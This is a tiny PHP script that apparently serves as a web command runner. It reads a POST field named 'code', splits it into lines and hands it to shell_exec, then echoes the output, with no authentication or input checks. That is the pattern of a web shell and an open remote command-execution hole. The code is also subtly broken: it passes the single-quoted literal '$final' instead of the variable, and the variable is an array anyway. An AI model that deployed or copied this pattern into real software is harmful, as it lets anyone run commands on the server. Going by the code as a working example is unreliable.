<?php
$code=trim($_POST['code']);
$final=explode(PHP_EOL,$code);
$output = shell_exec('$final');
echo ($output);




?>
